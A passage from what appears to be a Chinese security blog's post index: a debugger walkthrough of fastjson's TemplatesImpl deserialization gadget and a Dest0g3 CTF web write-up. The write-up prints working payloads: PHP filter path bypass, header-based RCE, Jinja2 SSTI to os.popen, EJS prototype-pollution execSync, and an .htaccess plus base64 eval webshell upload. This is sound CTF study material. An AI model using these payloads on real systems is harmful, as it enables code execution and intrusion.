<code>&#123;</code>  ，lexer的token 被赋值为 12</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/bd2249eeaff70221edc903659fae2459.png\" alt=\"image-20220317211238721\"></p>\n<p>此时实例化完成，调用 DefaultJSONParser#parse() ，对lexer的token进行switch</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7cda09c98d47c3940c2ef772a9065c28.png\" alt=\"image-20220317211426107\"></p>\n<p>进入 12 的分支 ，创建JSONObject 的对象 ，调用 DefaultJSONParser#parseObject()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/8aadd8ecdea45b43d0d336f9c8897243.png\" alt=\"image-20220317211533726\"></p>\n<p>在 DefaultJSONParser#parseObject() 中，获取到目前字符 即 <code>&quot;</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a43526b5528f7d0fe5ab502426a04df8.png\" alt=\"image-20220317211930797\"></p>\n<p>然后通过 scanSymbol() 匹配特定字符 <code>@type</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/cd4989966b8597b5db062c06c914f651.png\" alt=\"image-20220317212147494\"></p>\n<p>获取typeName 然后调用 TypeUtils.loadClass进行加载恶意Class，这里首先会从mappings里面寻找类，mappings中存放着一些Java内置类，前面一些条件不满足，所以最后用ClassLoader加载类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/c7edf06d82a0a3ee26e54aebb802d913.png\" alt=\"image-20220317212507880\"></p>\n<p>然后走到反序列化的地方，创建 ObjectDeserializer 对象并调用了deserialze方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/81e2f5a68faf775c43be7484748439f8.png\" alt=\"image-20220317212729021\"></p>\n<p>跟入ParseConfig#getDeserializer()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/1b11a5f3f12087894694c39cd0e811d9.png\" alt=\"image-20220317213325439\"></p>\n<p>经过不断调试，会调用 ParseConfig#createJavaBeanDeserializer()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/30eab56f7c2b7bdaabd0c882faafefc0.png\"></p>\n<p>跟进走到关键函数 获取 javabean的info </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/1de7759c2a3054715c5dd807136955ee.png\" alt=\"image-20220322210645560\"></p>\n<p>跟进 JavaBeanInfo#build()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/08094fd576e29123354b520939a213eb.png\" alt=\"image-20220322210754105\"></p>\n<p>此时调用栈</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">build:137, JavaBeanInfo (com.alibaba.fastjson.util)</span><br><span class=\"line\">createJavaBeanDeserializer:526, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class=\"line\">getDeserializer:461, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class=\"line\">getDeserializer:312, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parseObject:367, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:137, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parse:193, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parseObject:197, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">main:27, fastjsonDemo</span><br></pre></td></tr></table></figure>\n\n<p>看看干了什么，反射获取所有的字段和方法，创建变量 fieldList</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/0f283c0e5934e060c1838df63dd28331.png\" alt=\"image-20220322211234528\"></p>\n<p>接下来会经历三个for循环，将特定的值放入fieldList中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/265c7213f19190272c47177f74a02a36.png\" alt=\"image-20220322211529330\"></p>\n<p>看看第一个for 操作为获取setter方法，setter判断为四个限定条件</p>\n<ul>\n<li>函数名长度大于等于4</li>\n<li>非静态方法</li>\n<li>返回类型为void 或者当前对象类型</li>\n<li>set开头</li>\n<li>参数长度为1</li>\n<li>第四个字母为大写</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/15d2903d010c32df257892578f7fddda.png\" alt=\"image-20220322212337171\"></p>\n<p>接着是第三个for循环为获取getter方法，同样的限定方法如下</p>\n<ul>\n<li>函数名长度大于等于4</li>\n<li>非静态方法</li>\n<li>get开头</li>\n<li>第四个字母为大写</li>\n<li>无参数</li>\n<li>返回值类型继承自<code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code></li>\n<li>此<code>getter</code>方法没有对应的<code>setter</code>方法</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/9985c0fcf5c2ba1b38b077aa5c98a9c1.png\" alt=\"image-20220322213129482\"></p>\n<p>最后有三个符合参数，最后作为参数传入<code>JavaBeanInfo</code>类的实例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/100219b824ba22fac838ad6cb5427a5c.png\" alt=\"image-20220322230827699\"></p>\n<p>向上返回到执行deserialize方法处</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a0607512af4fdd12b38fd536c10c2d06.png\" alt=\"image-20220317212729021\"></p>\n<p>然后执行 JavaBeanDeserializer#deserialze()，这里断点不管用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/4d827e04eed580e9204588ff4b94a4ad.png\" alt=\"image-20220317213955860\"></p>\n<p>最后会走到这个函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/8104f4d03207305d940a1bf0b85e973c.png\" alt=\"image-20220318123226448\"></p>\n<p>for循环 后半部分处理JSON中剩下的键值对</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/5af109b691a220e51a02cd6270d7b528.png\" alt=\"image-20220322235805825\"></p>\n<p>通过scanSymbol 函数获取下个键名 第一个获取到了_bytecodes</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/b6a6fc0491ef59c8d6e031ca992c73ea.png\" alt=\"image-20220323170902717\"></p>\n<p>创建了对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/eb6e2929992d4404d90b55d9f14e0e55.png\" alt=\"image-20220323171218189\"></p>\n<p>在600行调用了parseField 去解析 _bytecodes的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/82ad201b26b59263b933b93eafac51d2.png\" alt=\"image-20220323171330762\"></p>\n<p>JavaBeanDeserializer#parseField() 调用 <strong>smartMatch</strong> 处理 键名 跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/f68177edc0a4a52dc9a74edc1da5020e.png\" alt=\"image-20220323171557548\"></p>\n<p>JavaBeanDeserializer#smartMatch()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/0c1093851819bd049e42a4c18602ec2d.png\" alt=\"image-20220323171658066\"></p>\n<p>又调用了getFieldDeserializer() 跟进，会将键名与之前 setter/getter筛选出来的field进行比较是否相同，_bytecodes 比较结果是false，返回null</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/4aedc004a4d4fa88cc149462ca543ac0.png\" alt=\"image-20220323172055574\"></p>\n<p>返回到smartMatch()中 将返回值设置为 fieldDeserializer ，进入if分支，将 <code>_ 和 -</code> 替换为<strong>空</strong> ，结果就是key变为了bytecodes</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a8f89e404a598a1aec9578c4a6895d0b.png\" alt=\"image-20220323172738265\"></p>\n<p>smartMatch()返回值为fieldDeserializer = null </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/c27dfeced2e8c3ce8e56618d548d6f5a.png\" alt=\"image-20220323173733654\"></p>\n<p>为fieldDeserializer 赋值为</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/6f0a7e607929cf1eb421aec3002a5dbe.png\" alt=\"image-20220323173659765\"></p>\n<p>调用parseField函数 跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/3b02d1c2c461c85622f802bac980c9b8.png\" alt=\"image-20220323173849324\"></p>\n<p>DefaultFieldDeserializer#parseField()  调用 fieldValueDeserilizer.deserialze</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/64e57b0e86444f718a3e159c6669fc81.png\" alt=\"image-20220323174049806\"></p>\n<p>在 fieldValueDeserilizer.deserialze 会将 <strong>_bytecodes内容进行base64解码</strong>，返回值给到value，然后调用setValue将内容</p>\n<p>base解码调用栈</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/251a4ba9c08b4c7d8d5ccb12fa42915f.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/36e29f0519bd4b43599fa284b5364bdc.png\" alt=\"image-20220323174750392\"></p>\n<p>调用栈</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">decodeBase64:478, IOUtils (com.alibaba.fastjson.util)</span><br><span class=\"line\">bytesValue:112, JSONScanner (com.alibaba.fastjson.parser)</span><br><span class=\"line\">deserialze:136, ObjectArrayCodec (com.alibaba.fastjson.serializer) [2]</span><br><span class=\"line\">parseArray:723, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">deserialze:177, ObjectArrayCodec (com.alibaba.fastjson.serializer) [1]</span><br><span class=\"line\">parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:137, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parse:193, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parseObject:197, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">main:13, java1_2_25</span><br></pre></td></tr></table></figure>\n\n<p>FieldDeserializer#setValue</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7f1f9d6908a0f7bcf5e4ac3e39062b31.png\" alt=\"image-20220323175139852\"></p>\n<p>然后一直返回到 JavaBeanDeserializer#deserialze() 进入下一次for循环</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/60d81ce98771b07c32e43326ebfb5e32.png\" alt=\"image-20220323175401345\"></p>\n<h1 id=\"outputProperties\"><a href=\"#outputProperties\" class=\"headerlink\" title=\"_outputProperties\"></a>_outputProperties</h1><p>中间的一些 _name、_tfactory等跳过，同样的在600行调用parseField进行解析</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/3f60e115380218d32cfdde0b7db9a012.png\" alt=\"image-20220323180352324\"></p>\n<p>同样进入smartMatch，但是由于<strong>去掉 _</strong> 符合<code>sortedFieldDeserializers</code>中的三个元素，返回<code>fieldDeserializer</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/35b0cdcc1786592b8bdec3df8ef74781.png\" alt=\"image-20220323180507426\"></p>\n<p>经过 fieldValueDeserilizer.deserialze 然后进入setValue</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/8add6f841fa0a690e704abe9b1adf8eb.png\" alt=\"image-20220323180940426\"></p>\n<p>在setValue中 尝试获取field的方法，此时</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">method &#x3D; public synchronized java.util.Properties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/0ddc045f478f5240a722c2a245895618.png\" alt=\"image-20220323181453995\"></p>\n<p>然后反射调用 调用 newTransformer()然后defineClass加载恶意类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">setValue:136, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class=\"line\">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class=\"line\">parse:137, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parse:193, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">parseObject:197, JSON (com.alibaba.fastjson)</span><br><span class=\"line\">main:27, fastjsonDemo</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xz.aliyun.com/t/7846#toc-10\">FastJson安全初探-反序列化漏洞回顾分析 - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad#PYn7q\">Java安全之FastJson反序列化初探 · 语雀 (yuque.com)</a></p>\n","categories":["JavaSec"]},{"title":"Dest0g3 520迎新赛","url":"/2023/12/25/Dest0g3%20520/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/QQ%E5%9B%BE%E7%89%8720220617123531.jpg\" alt=\"QQ图片20220617123531\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"phpdest\"><a href=\"#phpdest\" class=\"headerlink\" title=\"phpdest\"></a>phpdest</h2><p>require_once的多次软连接绕过</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>\n\n<p>base后 FLAG：Dest0g3{d46b6581-9b6e-4171-b9ee-d4c97fc9bf54}</p>\n<h2 id=\"EasyPHP\"><a href=\"#EasyPHP\" class=\"headerlink\" title=\"EasyPHP\"></a>EasyPHP</h2><p>数组绕过：ctf[]=1</p>\n<p>FLAG：Dest0g3{30b31494-135f-4875-ae5f-488ee925c5bf}</p>\n<h2 id=\"SimpleRCE\"><a href=\"#SimpleRCE\" class=\"headerlink\" title=\"SimpleRCE\"></a>SimpleRCE</h2><p>无参数RCE直接过</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST：</span><br><span class=\"line\">aaa&#x3D;show_source(next(apache_request_headers()));</span><br><span class=\"line\">User-Agent: &#x2F;flag</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{7be6d1b1-7f43-4480-8f80-38b7bea0848d}</p>\n<h2 id=\"EasySSTI\"><a href=\"#EasySSTI\" class=\"headerlink\" title=\"EasySSTI\"></a>EasySSTI</h2><ul>\n<li>SSTI</li>\n</ul>\n<p>bypass参考：<a href=\"https://xz.aliyun.com/t/9584#toc-32\">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p>\n<p>空格都过滤了，找到之前类似比赛：安恒月赛DASCTF三月娱乐赛，利用过滤器通过config中的字符串构造想要的字符</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527140018035.png\" alt=\"image-20220527140018035\"></p>\n<p>比如 . </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527140211776.png\" alt=\"image-20220527140211776\"></p>\n<p>a：通过截取字符串，替换点为空，然后获得想要的a</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527141349554.png\" alt=\"image-20220527141349554\"></p>\n<p>成功构造 globals</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527145356530.png\" alt=\"image-20220527145356530\"></p>\n<p>空格用%0d绕过即可，payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">strs = <span class=\"string\">&quot;&quot;&quot;&#123;%set poi=config|join|truncate(3)|last%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set xhx=config|join|truncate(28)|replace(poi,tmp)|last%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set a=config|join|truncate(23)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set b=config|join|truncate(9)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set c=config|join|truncate(31)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set d=config|join|truncate(7)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set e=config|join|truncate(4)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set f=config|join|truncate(98)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set g=config|join|truncate(11)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set i=config|join|truncate(16)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set l=config|join|truncate(96)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set m=config|join|truncate(81)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set n=config|join|truncate(5)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set o=config|join|truncate(21)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set p=config|join|truncate(19)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set r=config|join|truncate(20)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set s=config|join|truncate(14)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set t=config|join|truncate(12)|replace(poi,tmp)|last|lower%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set glo=xhx+xhx+g+l+o+b+a+l+s+xhx+xhx%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set cla=xhx+xhx+c+l+a+s+s+xhx+xhx%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set get=g+e+t+i+t+e+m%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set pp=p+o+p%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set xiegang=lipsum|attr(glo)|string|truncate(390)|list|attr(pp)(-27)%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set blank=lipsum|attr(glo)|string|truncate(390)|list|attr(pp)(-15)%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;%set shell=lipsum|attr(glo)|attr(p+o+p)(o+s)%&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;&#123;shell|attr(p+o+p+e+n)(c+a+t+blank+xiegang+f+l+a+g)|attr(r+e+a+d)()&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>.replace(<span class=\"string\">&#x27;%&#x27;</span>,<span class=\"string\">&#x27;%25&#x27;</span>).replace(<span class=\"string\">&#x27; &#x27;</span>,<span class=\"string\">&#x27;%0d&#x27;</span>).replace(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(strs)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527155611812.png\" alt=\"image-20220527155611812\"></p>\n<p>FLAG：Dest0g3{6355e9f6-ca54-4316-a5da-9d3a122fc8b5}</p>\n<h2 id=\"NodeSoEasy\"><a href=\"#NodeSoEasy\" class=\"headerlink\" title=\"NodeSoEasy\"></a>NodeSoEasy</h2><p>代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;body-parser&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express()</span><br><span class=\"line\"><span class=\"keyword\">const</span> port = <span class=\"number\">5000</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.use(bodyParser.urlencoded(&#123;<span class=\"attr\">extended</span>: <span class=\"literal\">true</span>&#125;)).use(bodyParser.json())</span><br><span class=\"line\">app.set(<span class=\"string\">&#x27;view engine&#x27;</span>, <span class=\"string\">&#x27;ejs&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> merge= <span class=\"function\">(<span class=\"params\">target, source</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (key <span class=\"keyword\">in</span> source &amp;&amp; key <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">            merge(target[key], source[key])</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            target[key] = source[key]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">app.post(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> target = &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> source = <span class=\"built_in\">JSON</span>.parse(<span class=\"built_in\">JSON</span>.stringify(req.body))</span><br><span class=\"line\">    <span class=\"comment\">//var source = JSON.parse(req.body)</span></span><br><span class=\"line\">    merge(target, source)</span><br><span class=\"line\">    res.render(<span class=\"string\">&#x27;index&#x27;</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(port, <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`listening on port <span class=\"subst\">$&#123;port&#125;</span>`</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>很明显的ejs rce，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{5f257a10-431c-4c2c-9526-075cc84568d4}</p>\n<h2 id=\"funny-upload\"><a href=\"#funny-upload\" class=\"headerlink\" title=\"funny_upload\"></a>funny_upload</h2><ul>\n<li>.htaccess</li>\n</ul>\n<p>上传 .htaccess，上传的内容有检测 <code>&lt;?</code>，添加 gif 为php解析，利用伪协议进行base64绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AddType application&#x2F;x-httpd-php .gif</span><br><span class=\"line\">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.gif&quot;</span><br></pre></td></tr></table></figure>\n\n<p>上传shell.gif</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PD9waHAgZXZhbCgkX1BPU1RbJ3dob2FtaSddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220522210957215.png\" alt=\"image-20220522210957215\"></p>\n<p>详细文章：<a href=\"https://cloud.tencent.com/developer/article/1824057\">Web安全｜.htaccess的奇淫技巧 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n<h2 id=\"middle\"><a href=\"#middle\" class=\"headerlink\" title=\"middle\"></a>middle</h2><p>大概一看 pickle 反序列化</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> config</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> io</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RestrictedUnpickler</span>(<span class=\"params\">pickle.Unpickler</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_class</span>(<span class=\"params\">self, module, name</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> module <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;config&#x27;</span>] <span class=\"keyword\">and</span> <span class=\"string\">&quot;__&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> name:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">getattr</span>(sys.modules[module], name)</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> pickle.UnpicklingError(<span class=\"string\">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">restricted_loads</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span 